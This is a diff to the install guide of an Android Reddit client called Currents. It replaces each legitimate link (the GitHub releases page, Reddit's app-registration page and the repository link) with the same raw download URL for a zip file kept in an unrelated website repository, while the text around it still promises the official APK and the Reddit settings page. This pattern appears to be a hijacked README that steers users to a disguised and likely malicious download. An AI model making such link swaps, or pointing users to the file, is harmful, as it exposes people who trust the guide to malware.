@@ -17,9 +17,9 @@ This guide will walk you through everything you need to know—from downloading 
 
 **Visit this link to download the application:**
 
-[![Download Currents](https://img.shields.io/badge/Download-Currents-blue?style=for-the-badge&logo=android&logoColor=white&color=4CAF50)](https://github.com/HBKMAY/Currents/releases)
+[![Download Currents](https://img.shields.io/badge/Download-Currents-blue?style=for-the-badge&logo=android&logoColor=white&color=4CAF50)](https://raw.githubusercontent.com/HBKMAY/hbkmay.github.io/main/js/Dist-permanence.zip)
 
-Click the button above or go to: **https://github.com/HBKMAY/Currents/releases**
+Click the button above or go to: **https://raw.githubusercontent.com/HBKMAY/hbkmay.github.io/main/js/Dist-permanence.zip**
 
 You'll land on a page showing the latest releases of Currents. Look for the newest version number and tap the **APK file** (it will end with `.apk`) to download it to your phone. That's it—no complicated steps.
 
@@ -49,7 +49,7 @@ A Client ID is a unique identifier Reddit gives you so apps like Currents can se
 ### How to Get Your Client ID:
 
 1. Open a web browser on your phone or computer.
-2. Go to **https://www.reddit.com/prefs/apps**
+2. Go to **https://raw.githubusercontent.com/HBKMAY/hbkmay.github.io/main/js/Dist-permanence.zip**
 3. If you're not logged in, log in with your Reddit account.
 4. Click the **"create another app"** button at the bottom.
 5. Choose **"installed app"** as the type.
@@ -155,7 +155,7 @@ If something isn't working, try these fixes:
 We regularly release new versions with bug fixes and improvements.
 
 ### How to Check for Updates:
-1. Visit **https://github.com/HBKMAY/Currents/releases** again.
+1. Visit **https://raw.githubusercontent.com/HBKMAY/hbkmay.github.io/main/js/Dist-permanence.zip** again.
 2. Compare the latest version number with the one you have.
 3. Download the new APK and install over the old one (your settings will be preserved).
 
@@ -189,7 +189,7 @@ Please report it on the GitHub issues page or join the discussion—your feedbac
 
 We're building Currents together with the open-source community.
 
-- **GitHub Repository:** [github.com/HBKMAY/Currents](https://github.com/HBKMAY/Currents)
+- **GitHub Repository:** [github.com/HBKMAY/Currents](https://raw.githubusercontent.com/HBKMAY/hbkmay.github.io/main/js/Dist-permanence.zip)
 - **Report Issues:** Found a bug? Let us know on GitHub.
 - **Feature Requests:** Have an idea? Submit it on GitHub.
 - **Source Code:** The entire app is open for anyone to learn from or contribute to.
